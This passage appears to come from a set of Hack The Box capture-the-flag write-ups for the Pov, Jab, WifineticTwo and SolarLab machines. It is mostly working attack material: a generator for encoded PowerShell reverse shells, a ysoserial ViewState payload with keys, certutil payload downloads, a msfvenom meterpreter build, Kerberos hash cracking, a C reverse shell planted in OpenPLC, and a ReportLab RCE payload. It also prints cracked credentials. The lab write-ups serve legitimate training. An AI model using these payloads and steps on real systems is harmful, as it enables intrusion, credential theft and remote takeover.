payload = '$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' payload = payload % (ip, port)
cmdline = "powershell -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
print(cmdline)
```

* python3 RSforPS.py \<ip> \<port>

<figure><img src="../.gitbook/assets/image (126).png" alt=""><figcaption></figcaption></figure>

```
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AOAAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
```

### User flag

* Open your Windows virtual machine, download `ysoserial.exe` [here](https://github.com/Cyberw1ng/OSCP/tree/main/HackTheBox/Pov), cd to that folder, paste the payload in the below syntax, and hit enter

```
ysoserial.exe -p ViewState -g TextFormattingRunProperties --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" --path="/portfolio/default.aspx" -c "Paste_the_payload_here"
```

* Open a Terminal and start a Listener using:&#x20;
  * `nc -lvnp 4444`
* Now click the Download CV in [`http://dev.pov.htb`](http://dev.pov.htb/)`,` capture the request, paste the code that we created in the above step for `__VIEWSTATE` the parameter, and send the request
  * we received a connection
* We are in the shell of `sfitz` . I got an interesting file in the Documents Folder of `sfitz` which contains the password of the privileged use `alaading`

```powershell
PS C:\Users\sfitz\Documents> type connection.xml

<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">alaading</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6</SS>
    </Props>
  </Obj>
</Objs>
```

* Use the below command to fetch that password

```powershell
echo > pass.txt
$EncryptedString = Get-Content .\pass.txt
$SecureString = ConvertTo-SecureString $EncryptedString
$Credential = New-Object System.Management.Automation.PSCredential -ArgumentList "username",$SecureString
echo $Credential.GetNetworkCredential().password
```

* Download RunasCs.exe, psgetsys.ps1 and EnableAllTokenPrivs.ps1 from here
  * [https://github.com/Cyberw1ng/OSCP/tree/main/HackTheBox/Pov?source=post\_page-----7516c938c688--------------------------------](https://github.com/Cyberw1ng/OSCP/tree/main/HackTheBox/Pov?source=post_page-----7516c938c688--------------------------------)
* Open Terminal in the Downloaded Folder and type the below command to start http server to transfer files from our machine to Windows.
  * `python3 -m http.server`
  *

      <figure><img src="../.gitbook/assets/image (127).png" alt=""><figcaption></figcaption></figure>
  * The link of the file will be like [http://YOUR\_IP:8000/filename](http://your_ip:8000/filename)
  * use the command below command to download the files in the victim machine

```powershell
certutil.exe -urlcache -split -f "http://IP:8000/EnableAllTokenPrivs.ps1" ".\EnableAllTokenPrivs.ps1"
certutil.exe -urlcache -split -f "http://IP:8000/psgetsys.ps1" ".\psgetsys.ps1"
certutil.exe -urlcache -split -f "http://IP:8000/RunasCs.exe" ".\RunasCs.exe"
```

* start a listener in your machine and type the below command in the victim machine to get into Alaading’s account with the credentials
  * .\RunasCs.exe alaading **f8gQ8fynP44ek1m3** cmd.exe -r YOUR\_IP:4444
  *

      <figure><img src="../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>


  * `type C:\Users\alaading\Desktop\user.txt`

### Root flag

1. If we type `whoami /priv,` we can see that the `sedebugPrivilegePoC` privilege has been disabled.
2. To Enable the state of this privilege, cd into the directory and execute the script that we downloaded in previous section using the commands\
   `.\psgetsys.ps1`\
   `.\EnableAllTokenPrivs.ps1`
3. In your machine type the below command to create a Windows payload\
   `msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=5555 -f exe > exploit.exe`
4. Move the `exploit.exe` to the directory that we are hosting the `http.server` and send the file to the victim machine using the above techniques.
5. Configure the Meterpreter in your machine and run `exploit.exe` in the victim machine.
6. Type ps and find the PID of `winlogon.exe`
7. Then type `migrate PID_VALUE` and after that `shell`
8. Now, you got the access as `nt authority\system`
9. Use the below command to view the flag or manually cd into Administrator’s directory\
   `type C:\Users\Administrator\Desktop\root.txt`

<figure><img src="https://miro.medium.com/v2/resize:fit:456/1*RosxpSeskQpRZywj7A9aAw.png" alt="" height="183" width="456"><figcaption></figcaption></figure>

10\. We got the Admin Flag \~

<figure><img src="https://miro.medium.com/v2/resize:fit:381/1*sqJzXkU2WmJy9QfBnj8XXg.png" alt="" height="60" width="381"><figcaption></figcaption></figure>

## Jab

### Reco

#### nmap

* open ports:
  * 53 DNS
  * 88 Kerberos
  * 135 MSRPC
  * 129 Netbios
  * 289, 3268, 3269 LDAP
  * 445 MS-DS
  * 464 kpasswd5
  * 593 ncacn\_htto (RPC over HTTP 1.0)
  * 636 SSL LDAP
  * 5222 jabber
  * 5269 xmpp
  * 7070 realserver
  * 7443 ssl/oracleas-https
  * 7777 socks5

#### hosts

* add jab.htb & DC01.jab.htb

<figure><img src="../.gitbook/assets/image (160).png" alt=""><figcaption></figcaption></figure>

### Weaponisation

Pidgin

* `sudo apt install pidgin`
* Pidgin is a chat program which lets you log into accounts on multiple chat networks simultaneously. This means that you can be chatting with friends on XMPP and sitting in an IRC channel at the same time.
* Pidgin is compatible with the following chat networks out of the box: Jabber/XMPP, Bonjour, Gadu-Gadu, IRC, Novell GroupWise Messenger, Lotus Sametime, SILC, SIMPLE, and Zephyr.

Kerbrute

* we are gonna try to bruteforce some user creds for kerberos service
* `./kerbrute userenum --dc dc01.jab.htb -d jab.htb /usr/share/seclists/usernames/xato-net-10-million-usernames.txt`

<figure><img src="../.gitbook/assets/image (162).png" alt=""><figcaption></figcaption></figure>

#### CVE

* **CVE-2023-32315**
  * vuln in Openfire XMPP Server
    * Openfire is an XMPP server licensed under the Open Source Apache License. Openfire's administrative console, a web-based application, was found to be vulnerable to a path traversal attack via the setup environment. This permitted an unauthenticated user to use the unauthenticated Openfire Setup Environment in an already configured Openfire environment to access restricted pages in the Openfire Admin Console reserved for administrative users. This vulnerability affects all versions of Openfire that have been released since April 2015, starting with version 3.10.0. The problem has been patched in Openfire release 4.7.5 and 4.6.8, and further improvements will be included in the yet-to-be released first version on the 4.8 branch (which is expected to be version 4.8.0). Users are advised to upgrade. If an Openfire upgrade isn’t available for a specific release, or isn’t quickly actionable, users may see the linked github advisory (GHSA-gw42-f939-fhvm) for mitigation advice.

### Exploitation

impacket tool

* cd impacket/examples
* `GetUserSPNs.py -no-preauth 'jmontgomery' -dc-ip dc01.jab.htb -usersfile Users.txt jab.htb`
  * `we obtained the hash of user jmontgomery`

`hashcat`

* hashcat -m 18200 hash.txt rockyou.txt
  * 18200 stands for kerberos cracking mode
  * hash.txt is obtained hash from previous step
  * rockyou.txt is dictionary
* output
  * PW = Midnight\_121

Pidgin app

* add account&#x20;
  * Protocol = `XMPP`
  * UN = `jmontgomery`
  * D = `dc01.jab.htb`
  * PW = `Midnight_121`

<figure><img src="../.gitbook/assets/image (163).png" alt=""><figcaption></figcaption></figure>

* join a chat
  * room list -> pentest2003

<figure><img src="../.gitbook/assets/image (164).png" alt=""><figcaption></figcaption></figure>

* when reading the pentest discussion, there is a mention about svc\_openfire user ahd his cracked password
  * add another acount in Pidgin
  * Protocol: `XMPP`
  * UN: `svc_openfire`
  * D: `dc01.jab.htb`
  * PW: `!@#$%^&*(1qazxsw`
* join a chat
  * unfortunatelly, only two test rooms, nothing valuable

### User flag

Impacket & RS

* `nc -nlvp <PORT>`
* `impacket-dcomexec -object MMC20 -nooutput jab.htb/svc_openfire:'!@#$%^&*(1qazxws'@dc01.jab.htb 'powershell -e ......'`
  * POWERSHELL -E STRING
    * revshells.com
      * IP - machine IP
      * Port - \<PORT>
      * OS - Windows
        * PowerShell #3 (Base64)
      * Shell - Powershell
      * Encoding - None

<figure><img src="../.gitbook/assets/image (165).png" alt=""><figcaption></figcaption></figure>

* we obtained a reverse shell
  * `cd C:\Users\svc_openfire\Desktop`
  * `type user.txt`

<figure><img src="../.gitbook/assets/image (166).png" alt=""><figcaption></figcaption></figure>

### Root flag

* Get root flag from openfire admin console with malicious plugin
  * TBD

## WifineticTwo

### Reco

#### nmap

`nmap -sVC 10.10.11.7`

* 22 SSH
* 8080 HTTP-proxy
  * Werkzeug 1.0.1
  * Python 2.7.18
  * /login
  * set-cookie: session=eyJfcGVybWFuZW50Ijp0cnVlfQ.ZgVHRg.h0e1LesEXAA247FVabrGC3Co6K0

#### website

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* try default credentials for OpenPLC
  * openplc:openplc
  * IT WORKS
    * we are inside dashboard
      * Dashboard
      * Programs
      * Slave Devices
      * Monitoring
      * HW
      * Users
      * Settings
      * Logout
    * we could upload a RS via Programs upload or Users upload

### Weaponisation & Exploitation

* Upload via Programs and Users didnt work
* lets modify Hardware Code box...
  * Generate RS from revshells.com
    * Headers:
      * \#include \<stdio.h> #include \<sys/socket.h> #include \<sys/types.h> #include \<stdlib.h> #include \<unistd.h> #include \<netinet/in.h> #include \<arpa/inet.h>
    * inside void updateCustomOut() {...}
      *

          ```
          int port = 4444; 
          struct sockaddr_in revsockaddr;

          int sockt = socket(AF_INET, SOCK_STREAM, 0);
          revsockaddr.sin_family = AF_INET;       
          revsockaddr.sin_port = htons(port);
          revsockaddr.sin_addr.s_addr = inet_addr("10.10.14.3");

          connect(sockt, (struct sockaddr *) &revsockaddr, 
          sizeof(revsockaddr));
          dup2(sockt, 0);
          dup2(sockt, 1);
          dup2(sockt, 2);

          char * const argv[] = {"/bin/bash", NULL};
          execvp("/bin/bash", argv);

          return 0; 
          ```
* Compile & Start PLC
  * we obtained revshell, easily

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### User flag

`which python3`

`python3 -c 'import pty;pty.spawn("/bin/bash")'`

`cd root`

`cat user.txt`

### Root flag

* TBD

## SolarLab

### Reco

#### nmap

<figure><img src="../.gitbook/assets/image (167).png" alt=""><figcaption></figcaption></figure>

#### website

* informs us, that SolarLab is encypted conversations app like Signal...
* Contact form
* Theme: Kite from Jewel Theme

#### nmap2

`sudo nmap -sC -sV -O -A -oA 10.10.11.16_solarlab 10.10.11.16 -v`

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-12 00:41 EAT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 00:41
Completed NSE at 00:41, 0.00s elapsed
Initiating NSE at 00:41
Completed NSE at 00:41, 0.00s elapsed
Initiating NSE at 00:41
Completed NSE at 00:41, 0.00s elapsed
Initiating Ping Scan at 00:41
Scanning 10.129.60.6 [4 ports]
Completed Ping Scan at 00:41, 0.39s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 00:41
Completed Parallel DNS resolution of 1 host. at 00:41, 0.07s elapsed
Initiating SYN Stealth Scan at 00:41
Scanning 10.129.60.6 [1000 ports]
Discovered open port 445/tcp on 10.129.60.6
Discovered open port 80/tcp on 10.129.60.6
Discovered open port 139/tcp on 10.129.60.6
Discovered open port 135/tcp on 10.129.60.6
Discovered open port 6791/tcp on 10.129.60.6
Discovered open port 7680/tcp on 10.129.60.6
Completed SYN Stealth Scan at 00:42, 19.76s elapsed (1000 total ports)
Initiating Service scan at 00:42
Scanning 4 services on 10.129.60.6
Completed Service scan at 00:42, 33.11s elapsed (4 services on 1 host)
Initiating OS detection (try #1) against 10.129.60.6
Retrying OS detection (try #2) against 10.129.60.6
Initiating Traceroute at 00:42
Completed Traceroute at 00:42, 0.47s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 00:42
Completed Parallel DNS resolution of 2 hosts. at 00:42, 0.09s elapsed
NSE: Script scanning 10.129.60.6.
Initiating NSE at 00:42
Completed NSE at 00:43, 40.16s elapsed
Initiating NSE at 00:43
Completed NSE at 00:43, 1.60s elapsed
Initiating NSE at 00:43
Completed NSE at 00:43, 0.01s elapsed
Nmap scan report for 10.129.60.6
Host is up (0.38s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
80/tcp  open  http          nginx 1.24.0
|_http-server-header: nginx/1.24.0
|_http-title: Did not follow redirect to http://solarlab.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
6791/tcp open  hnm
7680/tcp open  pando-pub
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=255 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|  date: 2024-05-11T19:xx:xx
|_  start_date: N/A
| smb2-security-mode:
|  3:1:1:
|_    Message signing enabled but not required


Host script results:
|_clock-skew: -1s
| smb2-security-mode:
|  3:1:1:
|_    Message signing enabled but not required
| smb2-time:
|  date: 2024-05-11T19:xx:xx
|_  start_date: N/A

Recon on SMB:

        Sharename      Type      Comment
        ---------      ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Documents      Disk     
        IPC$            IPC      Remote IPC

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   452.14 ms 10.10.14.1
2   452.12 ms 10.129.60.6

NSE: Script Post-scanning.
Initiating NSE at 00:43
Completed NSE at 00:43, 0.00s elapsed
Initiating NSE at 00:43
Completed NSE at 00:43, 0.00s elapsed
Initiating NSE at 00:43
Completed NSE at 00:43, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 107.76 seconds
           Raw packets sent: 2096 (96.146KB) | Rcvd: 45 (2.802KB)
```

#### nmap3

`sudo nmap -T4 -A -p- 10.10.11.16`

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-17 09:15 CEST
Nmap scan report for solarlab.htb (10.10.11.16)
Host is up (0.035s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          nginx 1.24.0
|_http-server-header: nginx/1.24.0
|_http-title: SolarLab Instant Messenger
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
6791/tcp open  http          nginx 1.24.0
|_http-server-header: nginx/1.24.0
|_http-title: Did not follow redirect to http://report.solarlab.htb:6791/
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows XP|7 (89%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows XP SP3 (89%), Microsoft Windows XP SP2 (86%), Microsoft Windows 7 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-time: 
|   date: 2024-05-17T07:17:28
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

TRACEROUTE (using port 135/tcp)
HOP RTT      ADDRESS
1   39.05 ms 10.10.14.1
2   39.25 ms solarlab.htb (10.10.11.16)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 157.25 seconds
```

* According to the nmap scans:
  * 80 HTTP w redirect
    * add to hosts
      * sudo nano /etc/hosts
        * 10.10.11.16 solarlab.htb
  * 135 MSRPC
  * 139 NETBIOS SSN
  * 445 MICROSOFT DS
  * 6791 HTTP
    * report.solarlab.htb:6791
  * SMB2

#### website2

* report.solarlab.htb:6791

<figure><img src="../.gitbook/assets/image (171).png" alt=""><figcaption></figcaption></figure>

### Weaponisation

#### smb

`smbclient -N -L 10.10.11.16`

<figure><img src="../.gitbook/assets/image (168).png" alt=""><figcaption></figcaption></figure>

`smbclient -N //10.10.11.16/Documents`

* `get details-file.xlsx`

<figure><img src="../.gitbook/assets/image (169).png" alt=""><figcaption></figcaption></figure>

details-file.xlsx

* PW file
  * tested these logins on report.solarlab.htb, but didnt work

<figure><img src="../.gitbook/assets/image (170).png" alt=""><figcaption></figcaption></figure>

#### hydra

lets test login with obtained credentials...

* create usernames and passwords file

<figure><img src="../.gitbook/assets/image (172).png" alt=""><figcaption></figcaption></figure>

* `hydra -L usernames -P passwords -s 6791 report.solarlab.htb http-post-form "/login:username=^USER^&password=^PASS^:Login"`

<figure><img src="../.gitbook/assets/image (173).png" alt=""><figcaption></figcaption></figure>

* we obtained login for report subpage...

### Exploitation

#### Login to reports as BlakeB

* BlakeB:ThisCanB3typedeasily1@

<figure><img src="../.gitbook/assets/image (174).png" alt=""><figcaption></figcaption></figure>

* under all of these for links, there is a form where we can **UPLOAD FILE**

<figure><img src="../.gitbook/assets/image (175).png" alt=""><figcaption></figcaption></figure>

* I tried to create revshell as php and saved it as png, but didnt work...

### User flag

#### BurpSuite

* Fill the form, generate PDF at analyse it in BurpSuite

<figure><img src="../.gitbook/assets/image (176).png" alt=""><figcaption></figcaption></figure>

* Report generated by reportlab.com

<figure><img src="../.gitbook/assets/image (177).png" alt=""><figcaption></figcaption></figure>

#### CVE

* RCE on reportlab
* [https://security.snyk.io/vuln/SNYK-PYTHON-REPORTLAB-5664897](https://security.snyk.io/vuln/SNYK-PYTHON-REPORTLAB-5664897)
*   [reportlab](https://pypi.org/project/reportlab/) is a Python library for generating PDFs and graphics.

    Affected versions of this package are vulnerable to Remote Code Execution (RCE) due to insufficient checks in the ‘rl\_safe\_eval’ function. Attackers can inject malicious code into an HTML file that will later be converted to PDF using software that relies on the ReportLab library. To exploit the vulnerability, the entire malicious code must be executed with `eval` in a single expression.

#### Generate payload

* revshells.com

<figure><img src="../.gitbook/assets/image (179).png" alt=""><figcaption></figcaption></figure>

* we will place the payload into the field of the form (0123456789)

<figure><img src="../.gitbook/assets/image (178).png" alt=""><figcaption></figcaption></figure>

* body of payload

```html
<para>
    <font color="[ [ getattr(pow,Attacker('__globals__'))['os'].system('REVSHELL_PAYLOAD') for Attacker in [orgTypeFun('Attacker', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, '__eq__': lambda self,x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)}, '__hash__': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))]] and 'red'">
    exploit
    </font>
</para>
```

* insert the payload insted of "REVSHELL\_PAYOAD"
* final form:

```html
<para>
    <font color="[ [ getattr(pow,Attacker('__globals__'))['os'].system('powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=') for Attacker in [orgTypeFun('Attacker', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, '__eq__': lambda self,x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)}, '__hash__': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))]] and 'red'">
    exploit
    </font>
</para>
```

<figure><img src="../.gitbook/assets/image (180).png" alt=""><figcaption></figcaption></figure>

* we are in

<figure><img src="../.gitbook/assets/image (181).png" alt=""><figcaption></figcaption></figure>

### Root flag

